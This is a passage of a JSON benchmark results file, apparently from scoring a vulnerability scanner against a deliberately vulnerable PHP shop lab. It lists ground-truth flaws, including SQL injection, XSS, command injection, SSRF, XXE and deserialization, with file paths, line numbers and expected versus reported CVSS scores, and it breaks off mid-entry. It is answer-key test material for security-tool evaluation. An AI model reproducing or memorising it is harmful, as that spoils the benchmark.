@@ -1,0 +1,4135 @@
+{
+  "protocol": "lab30-v2",
+  "scope": "all",
+  "class_scope": null,
+  "truths": 30,
+  "findings": 23,
+  "rating_standard": "CVSS:3.1",
+  "score_basis": "Base",
+  "TP": 22,
+  "D": 0,
+  "U": 1,
+  "FP": 1,
+  "FN": 8,
+  "precision": 0.9565217391304348,
+  "recall": 0.7333333333333333,
+  "f1": 0.8301886792452831,
+  "matches": [
+    {
+      "truth_id": "01",
+      "truth": "01 商品搜索 SQL 注入",
+      "finding_id": "2aad233871a24c91a491d81b3fea08ac",
+      "finding": "商品目录搜索 q 参数直接拼接进 LIKE 查询（反射型 SQL 注入）",
+      "class": "sqli",
+      "primary_location": {
+        "path": "lab30-shop/app/public/catalog/index.php",
+        "line": 4
+      },
+      "cvss_expected": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 7.5,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "N",
+          "UI": "N",
+          "S": "U",
+          "C": "H",
+          "I": "N",
+          "A": "N"
+        },
+        "severity": "high"
+      },
+      "cvss_reported": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 8.2,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "N",
+          "UI": "N",
+          "S": "U",
+          "C": "H",
+          "I": "L",
+          "A": "N"
+        },
+        "severity": "high"
+      },
+      "cvss_error": null,
+      "cvss_status": "compared",
+      "cvss_score_delta": 0.7,
+      "cvss_score_error": 0.7,
+      "cvss_score_ok": false,
+      "cvss_vector_ok": false,
+      "severity_expected": "high",
+      "severity_reported": "high",
+      "severity_ok": true
+    },
+    {
+      "truth_id": "02",
+      "truth": "02 到店欢迎反射型 XSS",
+      "finding_id": "5d49941ea36b4c14aaba5cec95eb33ce",
+      "finding": "catalog/greeting.php 的 name 参数未编码导致反射型 XSS",
+      "class": "xss_r",
+      "primary_location": {
+        "path": "lab30-shop/app/public/catalog/greeting.php",
+        "line": 3
+      },
+      "cvss_expected": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 6.1,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "N",
+          "UI": "R",
+          "S": "C",
+          "C": "L",
+          "I": "L",
+          "A": "N"
+        },
+        "severity": "medium"
+      },
+      "cvss_reported": null,
+      "cvss_error": null,
+      "cvss_status": "missing_reported",
+      "cvss_score_delta": null,
+      "cvss_score_error": null,
+      "cvss_score_ok": null,
+      "cvss_vector_ok": null,
+      "severity_expected": "medium",
+      "severity_reported": "unknown",
+      "severity_ok": false
+    },
+    {
+      "truth_id": "03",
+      "truth": "03 网络诊断命令注入",
+      "finding_id": "7d557370dabe4a41ba0c681deb30a0a1",
+      "finding": "运营主机巡检 host 参数未过滤直接拼接 shell_exec 造成命令注入",
+      "class": "command_injection",
+      "primary_location": {
+        "path": "lab30-shop/app/public/ops/ping.php",
+        "line": 2
+      },
+      "cvss_expected": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 7.2,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "H",
+          "UI": "N",
+          "S": "U",
+          "C": "H",
+          "I": "H",
+          "A": "H"
+        },
+        "severity": "high"
+      },
+      "cvss_reported": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 8.8,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "L",
+          "UI": "N",
+          "S": "U",
+          "C": "H",
+          "I": "H",
+          "A": "H"
+        },
+        "severity": "high"
+      },
+      "cvss_error": null,
+      "cvss_status": "compared",
+      "cvss_score_delta": 1.6,
+      "cvss_score_error": 1.6,
+      "cvss_score_ok": false,
+      "cvss_vector_ok": false,
+      "severity_expected": "high",
+      "severity_reported": "high",
+      "severity_ok": true
+    },
+    {
+      "truth_id": "04",
+      "truth": "04 帮助文档路径遍历读取任意文件",
+      "finding_id": "eac118f98bf744b498228eacf22fd396",
+      "finding": "support/download.php 直接拼接 $_GET['file'] 到文档目录，导致任意文件读取",
+      "class": "path_traversal",
+      "primary_location": {
+        "path": "lab30-shop/app/public/support/download.php",
+        "line": 3
+      },
+      "cvss_expected": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 6.5,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "L",
+          "UI": "N",
+          "S": "U",
+          "C": "H",
+          "I": "N",
+          "A": "N"
+        },
+        "severity": "medium"
+      },
+      "cvss_reported": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 6.5,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "L",
+          "UI": "N",
+          "S": "U",
+          "C": "H",
+          "I": "N",
+          "A": "N"
+        },
+        "severity": "medium"
+      },
+      "cvss_error": null,
+      "cvss_status": "compared",
+      "cvss_score_delta": 0.0,
+      "cvss_score_error": 0.0,
+      "cvss_score_ok": true,
+      "cvss_vector_ok": true,
+      "severity_expected": "medium",
+      "severity_reported": "medium",
+      "severity_ok": true
+    },
+    {
+      "truth_id": "05",
+      "truth": "05 内容中心本地文件包含",
+      "finding_id": "5783491e92f4458082050a3863ac0095",
+      "finding": "content/page.php 本地文件包含：未过滤 page 参数拼接 include 路径",
+      "class": "lfi",
+      "primary_location": {
+        "path": "lab30-shop/app/public/content/page.php",
+        "line": 3
+      },
+      "cvss_expected": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 5.3,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "N",
+          "UI": "N",
+          "S": "U",
+          "C": "L",
+          "I": "N",
+          "A": "N"
+        },
+        "severity": "medium"
+      },
+      "cvss_reported": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 5.3,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "N",
+          "UI": "N",
+          "S": "U",
+          "C": "L",
+          "I": "N",
+          "A": "N"
+        },
+        "severity": "medium"
+      },
+      "cvss_error": null,
+      "cvss_status": "compared",
+      "cvss_score_delta": 0.0,
+      "cvss_score_error": 0.0,
+      "cvss_score_ok": true,
+      "cvss_vector_ok": true,
+      "severity_expected": "medium",
+      "severity_reported": "medium",
+      "severity_ok": true
+    },
+    {
+      "truth_id": "06",
+      "truth": "06 远程模板预览远程文件包含",
+      "finding_id": "633719c82cd64d56bc043d63f5b5df83",
+      "finding": "template-preview.php 远程文件包含：include 直接使用用户 template 参数且 allow_url_include=On",
+      "class": "rfi",
+      "primary_location": {
+        "path": "lab30-shop/app/public/ops/template-preview.php",
+        "line": 3
+      },
+      "cvss_expected": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 7.2,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "H",
+          "UI": "N",
+          "S": "U",
+          "C": "H",
+          "I": "H",
+          "A": "H"
+        },
+        "severity": "high"
+      },
+      "cvss_reported": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 7.2,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "H",
+          "UI": "N",
+          "S": "U",
+          "C": "H",
+          "I": "H",
+          "A": "H"
+        },
+        "severity": "high"
+      },
+      "cvss_error": null,
+      "cvss_status": "compared",
+      "cvss_score_delta": 0.0,
+      "cvss_score_error": 0.0,
+      "cvss_score_ok": true,
+      "cvss_vector_ok": true,
+      "severity_expected": "high",
+      "severity_reported": "high",
+      "severity_ok": true
+    },
+    {
+      "truth_id": "08",
+      "truth": "08 继续访问开放重定向",
+      "finding_id": "d5eedb8664a24e029b3279ca593c5f5b",
+      "finding": "auth/continue.php 的 next 参数未校验即写入 Location 头，导致开放重定向",
+      "class": "open_redirect",
+      "primary_location": {
+        "path": "lab30-shop/app/public/auth/continue.php",
+        "line": 3
+      },
+      "cvss_expected": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 0.0,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:N",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "N",
+          "UI": "R",
+          "S": "U",
+          "C": "N",
+          "I": "N",
+          "A": "N"
+        },
+        "severity": "none"
+      },
+      "cvss_reported": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 4.3,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "N",
+          "UI": "R",
+          "S": "U",
+          "C": "N",
+          "I": "L",
+          "A": "N"
+        },
+        "severity": "medium"
+      },
+      "cvss_error": null,
+      "cvss_status": "compared",
+      "cvss_score_delta": 4.3,
+      "cvss_score_error": 4.3,
+      "cvss_score_ok": false,
+      "cvss_vector_ok": false,
+      "severity_expected": "none",
+      "severity_reported": "medium",
+      "severity_ok": false
+    },
+    {
+      "truth_id": "11",
+      "truth": "11 在线留言存储型 XSS",
+      "finding_id": "43b0838f093d472c9143038ec56e1e96",
+      "finding": "support/messages.php 留言内容未编码导致存储型 XSS",
+      "class": "xss_s",
+      "primary_location": {
+        "path": "lab30-shop/app/public/support/messages.php",
+        "line": 5
+      },
+      "cvss_expected": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 5.4,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "L",
+          "UI": "R",
+          "S": "C",
+          "C": "L",
+          "I": "L",
+          "A": "N"
+        },
+        "severity": "medium"
+      },
+      "cvss_reported": null,
+      "cvss_error": null,
+      "cvss_status": "missing_reported",
+      "cvss_score_delta": null,
+      "cvss_score_error": null,
+      "cvss_score_ok": null,
+      "cvss_vector_ok": null,
+      "severity_expected": "medium",
+      "severity_reported": "unknown",
+      "severity_ok": false
+    },
+    {
+      "truth_id": "12",
+      "truth": "12 链接预览服务端请求伪造",
+      "finding_id": "bc328ee5aef640c58a4a4f22afe0015e",
+      "finding": "运营 URL 预览 GET url 直接交给 file_get_contents 造成 SSRF",
+      "class": "ssrf",
+      "primary_location": {
+        "path": "lab30-shop/app/public/ops/url-preview.php",
+        "line": 3
+      },
+      "cvss_expected": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 4.9,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "H",
+          "UI": "N",
+          "S": "U",
+          "C": "H",
+          "I": "N",
+          "A": "N"
+        },
+        "severity": "medium"
+      },
+      "cvss_reported": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 4.3,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "L",
+          "UI": "N",
+          "S": "U",
+          "C": "L",
+          "I": "N",
+          "A": "N"
+        },
+        "severity": "medium"
+      },
+      "cvss_error": null,
+      "cvss_status": "compared",
+      "cvss_score_delta": -0.6,
+      "cvss_score_error": 0.6,
+      "cvss_score_ok": false,
+      "cvss_vector_ok": false,
+      "severity_expected": "medium",
+      "severity_reported": "medium",
+      "severity_ok": true
+    },
+    {
+      "truth_id": "13",
+      "truth": "13 合作方配置导入 XXE",
+      "finding_id": "addbc91072b7478c8aa7d68521c49c73",
+      "finding": "xml-import.php 以 LIBXML_NOENT|LIBXML_DTDLOAD 解析用户 XML 造成 XXE 文件读取",
+      "class": "xxe",
+      "primary_location": {
+        "path": "lab30-shop/app/public/ops/xml-import.php",
+        "line": 3
+      },
+      "cvss_expected": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 4.9,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "H",
+          "UI": "N",
+          "S": "U",
+          "C": "H",
+          "I": "N",
+          "A": "N"
+        },
+        "severity": "medium"
+      },
+      "cvss_reported": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 6.5,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "L",
+          "UI": "N",
+          "S": "U",
+          "C": "H",
+          "I": "N",
+          "A": "N"
+        },
+        "severity": "medium"
+      },
+      "cvss_error": null,
+      "cvss_status": "compared",
+      "cvss_score_delta": 1.6,
+      "cvss_score_error": 1.6,
+      "cvss_score_ok": false,
+      "cvss_vector_ok": false,
+      "severity_expected": "medium",
+      "severity_reported": "medium",
+      "severity_ok": true
+    },
+    {
+      "truth_id": "15",
+      "truth": "15 会员备份不安全反序列化权益篡改",
+      "finding_id": "e4c0d7fa5c0640dbb7e81a774b02ae04",
+      "finding": "会员备份恢复对 POST 数据直接 unserialize 导致 PHP 对象注入",
+      "class": "insecure_deserialization",
+      "primary_location": {
+        "path": "lab30-shop/app/public/account/backup.php",
+        "line": 5
+      },
+      "cvss_expected": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 4.3,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "L",
+          "UI": "N",
+          "S": "U",
+          "C": "N",
+          "I": "L",
+          "A": "N"
+        },
+        "severity": "medium"
+      },
+      "cvss_reported": null,
+      "cvss_error": null,
+      "cvss_status": "missing_reported",
+      "cvss_score_delta": null,
+      "cvss_score_error": null,
+      "cvss_score_ok": null,
+      "cvss_vector_ok": null,
+      "severity_expected": "medium",
+      "severity_reported": "unknown",
+      "severity_ok": false
+    },
+    {
+      "truth_id": "16",
+      "truth": "16 订单详情越权访问（IDOR）",
+      "finding_id": "6f9baa7bb5694f4e8d2f1635f38c7d9f",
+      "finding": "orders/detail.php 仅按订单 id 查询、无用户归属校验，任意登录用户可读他人订单",
+      "class": "idor",
+      "primary_location": {
+        "path": "lab30-shop/app/public/orders/detail.php",
+        "line": 2
+      },
+      "cvss_expected": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 6.5,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "L",
+          "UI": "N",
+          "S": "U",
+          "C": "H",
+          "I": "N",
+          "A": "N"
+        },
+        "severity": "medium"
+      },
+      "cvss_reported": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 6.5,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "L",
+          "UI": "N",
+          "S": "U",
+          "C": "H",
+          "I": "N",
+          "A": "N"
+        },
+        "severity": "medium"
+      },
+      "cvss_error": null,
+      "cvss_status": "compared",
+      "cvss_score_delta": 0.0,
+      "cvss_score_error": 0.0,
+      "cvss_score_ok": true,
+      "cvss_vector_ok": true,
+      "severity_expected": "medium",
+      "severity_reported": "medium",
+      "severity_ok": true
+    },
+    {
+      "truth_id": "19",
+      "truth": "19 下单信任客户端单价金额篡改",
+      "finding_id": "7c8e155d6b5741d7be73c3dab2bc6a10",
+      "finding": "订单创建信任客户端提交的 price，可任意低价下单",
+      "class": "price_manipulation",
+      "primary_location": {
+        "path": "lab30-shop/app/public/orders/create.php",
+        "line": 5
+      },
+      "cvss_expected": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 6.5,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "L",
+          "UI": "N",
+          "S": "U",
+          "C": "N",
+          "I": "H",
+          "A": "N"
+        },
+        "severity": "medium"
+      },
+      "cvss_reported": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 6.5,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "L",
+          "UI": "N",
+          "S": "U",
+          "C": "N",
+          "I": "H",
+          "A": "N"
+        },
+        "severity": "medium"
+      },
+      "cvss_error": null,
+      "cvss_status": "compared",
+      "cvss_score_delta": 0.0,
+      "cvss_score_error": 0.0,
+      "cvss_score_ok": true,
+      "cvss_vector_ok": true,
+      "severity_expected": "medium",
+      "severity_reported": "medium",
+      "severity_ok": true
+    },
+    {
+      "truth_id": "20",
+      "truth": "20 提现竞争条件重复支付",
+      "finding_id": "168e43edeee643d6a8d80cfc004090ba",
+      "finding": "提现先读后写无锁，競态可重复扣减同一余额实现超额提现",
+      "class": "race_condition",
+      "primary_location": {
+        "path": "lab30-shop/app/public/wallet/withdraw.php",
+        "line": 7
+      },
+      "cvss_expected": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 5.3,
+        "base_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N",
+        "metrics": {
+          "AV": "N",
+          "AC": "H",
+          "PR": "L",
+          "UI": "N",
+          "S": "U",
+          "C": "N",
+          "I": "H",
+          "A": "N"
+        },
+        "severity": "medium"
+      },
+      "cvss_reported": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 5.3,
+        "base_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N",
+        "metrics": {
+          "AV": "N",
+          "AC": "H",
+          "PR": "L",
+          "UI": "N",
+          "S": "U",
+          "C": "N",
+          "I": "H",
+          "A": "N"
+        },
+        "severity": "medium"
+      },
+      "cvss_error": null,
+      "cvss_status": "compared",
+      "cvss_score_delta": 0.0,
+      "cvss_score_error": 0.0,
+      "cvss_score_ok": true,
+      "cvss_vector_ok": true,
+      "severity_expected": "medium",
+      "severity_reported": "medium",
+      "severity_ok": true
+    },
+    {
+      "truth_id": "21",
+      "truth": "21 会话固定",
+      "finding_id": "0e642f7c599c4d2a8a0e1973916b983b",
+      "finding": "auth/login.php 接受 sid 参数指定会话 ID，登录后不重建会话导致会话固定",
+      "class": "session_fixation",
+      "primary_location": {
+        "path": "lab30-shop/app/public/auth/login.php",
+        "line": 3
+      },
+      "cvss_expected": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 8.1,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "N",
+          "UI": "R",
+          "S": "U",
+          "C": "H",
+          "I": "H",
+          "A": "N"
+        },
+        "severity": "high"
+      },
+      "cvss_reported": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 7.1,
+        "base_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:L",
+        "metrics": {
+          "AV": "N",
+          "AC": "H",
+          "PR": "N",
+          "UI": "R",
+          "S": "U",
+          "C": "H",
+          "I": "H",
+          "A": "L"
+        },
+        "severity": "high"
+      },
+      "cvss_error": null,
+      "cvss_status": "compared",
+      "cvss_score_delta": -1.0,
+      "cvss_score_error": 1.0,
+      "cvss_score_ok": false,
+      "cvss_vector_ok": false,
+      "severity_expected": "high",
+      "severity_reported": "high",
+      "severity_ok": true
+    },
+    {
+      "truth_id": "22",
+      "truth": "22 会员兑换码弱类型比较绕过",
+      "finding_id": "5a0a00576fa249cfb5ad3466c54cf27f",
+      "finding": "account/redeem.php 使用 == 比较 MD5，弱类型绕过兑换码免费升级金卡",
+      "class": "weak_type_comparison",
+      "primary_location": {
+        "path": "lab30-shop/app/public/account/redeem.php",
+        "line": 5
+      },
+      "cvss_expected": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 4.3,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "L",
+          "UI": "N",
+          "S": "U",
+          "C": "N",
+          "I": "L",
+          "A": "N"
+        },
+        "severity": "medium"
+      },
+      "cvss_reported": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 3.1,
+        "base_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N",
+        "metrics": {
+          "AV": "N",
+          "AC": "H",
+          "PR": "L",
+          "UI": "N",
+          "S": "U",
+          "C": "N",
+          "I": "L",
+          "A": "N"
+        },
+        "severity": "low"
+      },
+      "cvss_error": null,
+      "cvss_status": "compared",
+      "cvss_score_delta": -1.2,
+      "cvss_score_error": 1.2,
+      "cvss_score_ok": false,
+      "cvss_vector_ok": false,
+      "severity_expected": "medium",
+      "severity_reported": "low",
+      "severity_ok": false
+    },
+    {
+      "truth_id": "25",
+      "truth": "25 个人主页 HTML 属性注入型 XSS",
+      "finding_id": "7d425e28404445b7b8301548aba889b1",
+      "finding": "account/profile.php 将 GET url 原样拼入 href，javascript: 伪协议反射型 XSS",
+      "class": "xss_r",
+      "primary_location": {
+        "path": "lab30-shop/app/public/account/profile.php",
+        "line": 3
+      },
+      "cvss_expected": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 6.1,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "N",
+          "UI": "R",
+          "S": "C",
+          "C": "L",
+          "I": "L",
+          "A": "N"
+        },
+        "severity": "medium"
+      },
+      "cvss_reported": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 5.4,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "N",
+          "UI": "R",
+          "S": "U",
+          "C": "L",
+          "I": "L",
+          "A": "N"
+        },
+        "severity": "medium"
+      },
+      "cvss_error": null,
+      "cvss_status": "compared",
+      "cvss_score_delta": -0.7,
+      "cvss_score_error": 0.7,
+      "cvss_score_ok": false,
+      "cvss_vector_ok": false,
+      "severity_expected": "medium",
+      "severity_reported": "medium",
+      "severity_ok": true
+    },
+    {
+      "truth_id": "26",
+      "truth": "26 合作方结算 JWT 未校验签名身份伪造",
+      "finding_id": "966576d2146344879dcbedc45dc3fcca",
+      "finding": "partner/portal.php 仅解码 JWT payload 不验签，构造 role=admin 令牌即可越权读取全部订单",
+      "class": "auth_bypass",
+      "primary_location": {
+        "path": "lab30-shop/app/public/partner/portal.php",
+        "line": 2
+      },
+      "cvss_expected": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 5.3,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "N",
+          "UI": "N",
+          "S": "U",
+          "C": "L",
+          "I": "N",
+          "A": "N"
+        },
+        "severity": "medium"
+      },
+      "cvss_reported": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 8.6,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "N",
+          "UI": "N",
+          "S": "C",
+          "C": "H",
+          "I": "N",
+          "A": "N"
+        },
+        "severity": "high"
+      },
+      "cvss_error": null,
+      "cvss_status": "compared",
+      "cvss_score_delta": 3.3,
+      "cvss_score_error": 3.3,
+      "cvss_score_ok": false,
+      "cvss_vector_ok": false,
+      "severity_expected": "medium",
+      "severity_reported": "high",
+      "severity_ok": false
+    },
+    {
+      "truth_id": "27",
+      "truth": "27 任务导入反序列化链命令执行",
+      "finding_id": "fe228c9b642d456694f9b45fb29d5e92",
+      "finding": "任务导入 unserialize 用户数据触发 DispatchJob::__wakeup 的 shell_exec 命令执行",
+      "class": "insecure_deserialization",
+      "primary_location": {
+        "path": "lab30-shop/app/public/ops/jobs.php",
+        "line": 3
+      },
+      "cvss_expected": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 7.2,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "H",
+          "UI": "N",
+          "S": "U",
+          "C": "H",
+          "I": "H",
+          "A": "H"
+        },
+        "severity": "high"
+      },
+      "cvss_reported": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 8.8,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "L",
+          "UI": "N",
+          "S": "U",
+          "C": "H",
+          "I": "H",
+          "A": "H"
+        },
+        "severity": "high"
+      },
+      "cvss_error": null,
+      "cvss_status": "compared",
+      "cvss_score_delta": 1.6,
+      "cvss_score_error": 1.6,
+      "cvss_score_ok": false,
+      "cvss_vector_ok": false,
+      "severity_expected": "high",
+      "severity_reported": "high",
+      "severity_ok": true
+    },
+    {
+      "truth_id": "28",
+      "truth": "28 会员报表二次 SQL 注入",
+      "finding_id": "5aff729ccaaa4480a9e526a947f58de9",
+      "finding": "会员报表 nickname 二次 SQL 注入（用户资料写入后未参数化拼接）",
+      "class": "sqli",
+      "primary_location": {
+        "path": "lab30-shop/app/public/ops/report.php",
+        "line": 3
+      },
+      "cvss_expected": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 3.5,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "L",
+          "UI": "R",
+          "S": "U",
+          "C": "N",
+          "I": "L",
+          "A": "N"
+        },
+        "severity": "low"
+      },
+      "cvss_reported": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 4.8,
+        "base_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:N/A:N",
+        "metrics": {
+          "AV": "N",
+          "AC": "H",
+          "PR": "L",
+          "UI": "R",
+          "S": "U",
+          "C": "H",
+          "I": "N",
+          "A": "N"
+        },
+        "severity": "medium"
+      },
+      "cvss_error": null,
+      "cvss_status": "compared",
+      "cvss_score_delta": 1.3,
+      "cvss_score_error": 1.3,
+      "cvss_score_ok": false,
+      "cvss_vector_ok": false,
+      "severity_expected": "low",
+      "severity_reported": "medium",
+      "severity_ok": false
+    },
+    {
+      "truth_id": "29",
+      "truth": "29 营销排版模板表达式执行",
+      "finding_id": "cbc0430810e6455eabc064331bd9a754",
+      "finding": "运营模板渲染将 {{...}} 表达式直接传入 eval 造成代码执行",
+      "class": "code_execution",
+      "primary_location": {
+        "path": "lab30-shop/app/public/ops/template-render.php",
+        "line": 3
+      },
+      "cvss_expected": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 7.2,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "H",
+          "UI": "N",
+          "S": "U",
+          "C": "H",
+          "I": "H",
+          "A": "H"
+        },
+        "severity": "high"
+      },
+      "cvss_reported": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 8.8,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "L",
+          "UI": "N",
+          "S": "U",
+          "C": "H",
+          "I": "H",
+          "A": "H"
+        },
+        "severity": "high"
+      },
+      "cvss_error": null,
+      "cvss_status": "compared",
+      "cvss_score_delta": 1.6,
+      "cvss_score_error": 1.6,
+      "cvss_score_ok": false,
+      "cvss_vector_ok": false,
+      "severity_expected": "high",
+      "severity_reported": "high",
+      "severity_ok": true
+    },
+    {
+      "truth_id": "30",
+      "truth": "30 会员资料批量赋值敏感字段修改",
+      "finding_id": "618fed4dab94434c9f2d11308ca4829e",
+      "finding": "account/update.php 批量赋值允许登录用户将自身 role/balance 改写（提权与余额篡改）",
+      "class": "mass_assignment",
